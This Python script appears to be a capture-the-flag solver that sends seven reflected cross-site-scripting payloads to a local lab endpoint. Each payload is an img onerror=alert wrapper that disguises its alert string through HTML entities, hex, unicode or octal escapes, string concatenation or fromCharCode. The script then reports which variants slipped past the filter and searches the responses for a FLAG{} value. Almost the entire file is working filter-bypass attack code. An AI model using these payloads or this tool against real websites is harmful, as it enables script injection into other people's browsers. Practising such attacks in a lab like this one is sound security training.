import requests
import urllib.parse
import re

# Target configuration
base_url = "http://127.0.0.1:33117/page?name="

# Define payload variations (each will be URL-encoded before sending)
payloads = {
    "HTML entity": '\"><img src=x onerror=alert(\'&#88;&#83;&#83;\')>',
    "URL encoding": '\"><img src=x onerror=alert(\'XSS\')>',  # XSS in base64 variant: WFNTEA==
    "Hex escape": '\"><img src=x onerror=alert(\'\\x58\\x53\\x53\')>',
    "Unicode escape": '\"><img src=x onerror=alert(\'\\\\u0058\\\\u0053\\\\u0053\')>',
    "Octal escape": '\"><img src=x onerror=alert(\'\\\\130\\\\123\\\\123\')>',
    "String concat": '\"><img src=x onerror=alert(\'X\'+\'SS\')>',
    "FromCharCode": '\"><img src=x onerror=alert(String.fromCharCode(88,83,83))>'
}

# Test each payload
results = {}

print("=" * 80)
print("XSS FILTER BYPASS TEST RESULTS")
print("=" * 80)
print(f"\nTarget Endpoint: /page?name=PAYLOAD")
print(f"Total payload variations to test: {len(payloads)}")
print("\n" + "=" * 80)

for encoding_name, payload in payloads.items():
    # URL encode the entire payload before sending
    encoded_payload = urllib.parse.quote(payload, safe='')
    url = base_url + encoded_payload
    
    try:
        response = requests.get(url, timeout=10)
        response_text = response.text
        status = response.status_code
        
        print(f"\n🔍 Testing: {encoding_name}")
        print(f"   Payload: {payload}")
        print(f"   URL Encoded: {encoded_payload}")
        print(f"   Full URL: {url}")
        print(f"   Status: {status}")
        print(f"   Response Length: {len(response_text)} bytes")
        
        # Check if the original 'XSS' literal is in response
        has_xss_literal = "'XSS'" in response_text or '"XSS"' in response_text
        
        # Check if the encoded version appears (partial or full)
        has_encoded_version = any([
            '&#88;' in response_text or '&#83;' in response_text,  # HTML entities
            '\\x58\\x53\\x53' in response_text,  # Hex escape
            '\\\\u0058\\\\u0053\\\\u0053' in response_text,  # Unicode escape
            '\\\\130\\\\123\\\\123' in response_text,  # Octal escape
            "'X'+'SS'" in response_text,  # String concat
            'String.fromCharCode(88,83,83)' in response_text  # FromCharCode
        ])
        
        # Check if our exact payload appears
        if payload in response_text:
            print(f"   ✅ SUCCESS: Payload reflected verbatim!")
            reflection_status = "FULLY REFLECTED"
        elif has_encoded_version:
            print(f"   ⚠️  PARTIAL: Encoded version appeared but modified")
            reflection_status = "ENCODED APPEARED"
        else:
            print(f"   ❌ BLOCKED: Payload not found in response")
            reflection_status = "BLOCKED"
        
        # Check for FLAG pattern
        flag_match = re.search(r'FLAG\{[^}]+\}', response_text.upper())
        if flag_match:
            print(f"   🚩 FLAG FOUND: {flag_match.group()}")
        
        # Store results
        results[encoding_name] = {
            'status': status,
            'reflection': reflection_status,
            'response_length': len(response_text),
            'has_xss_literal': has_xss_literal,
            'has_encoded_version': has_encoded_version,
            'flag_found': flag_match.group() if flag_match else None
        }
        
        # Print response snippet if payload reflected
        if reflection_status in ["FULLY REFLECTED", "ENCODED APPEARED"]:
            # Find where our payload appears
            if payload in response_text:
                idx = response_text.index(payload)
                start = max(0, idx - 100)
                end = min(len(response_text), idx + len(payload) + 200)
                snippet = response_text[start:end]
                print(f"\n   Response snippet:\n   >>> {snippet}\n")
        
    except Exception as e:
        print(f"   ❌ ERROR: {e}")
        results[encoding_name] = {'error': str(e)}

# Final summary
print("\n" + "=" * 80)
print("SUMMARY")
print("=" * 80)

bypass_successful = []
for encoding_name, result in results.items():
    if 'reflection' in result and result['reflection'] == 'FULLY REFLECTED':
        bypass_successful.append(encoding_name)
        print(f"✅ {encoding_name}: BYPASSED FILTER")
    elif 'reflection' in result and result['reflection'] == 'ENCODED APPEARED':
        print(f"⚠️  {encoding_name}: PARTIAL BYPASS")
    elif 'error' in result:
        print(f"❌ {encoding_name}: ERROR - {result['error']}")
    else:
        print(f"❌ {encoding_name}: BLOCKED")

print(f"\n🔢 Total successful bypasses: {len(bypass_successful)}")
if bypass_successful:
    print(f"✨ Working techniques: {', '.join(bypass_successful)}")

# Check for any flags in any response
all_flags = []
for encoding_name, result in results.items():
    if result.get('flag_found'):
        all_flags.append((encoding_name, result['flag_found']))

if all_flags:
    print(f"\n🏁 FLAGS FOUND: {len(all_flags)}")
    for encoding, flag in all_flags:
        print(f"   {encoding}: {flag}")
else:
    print(f"\n🔍 No FLAG{{}} patterns found in any responses")

print("\n")
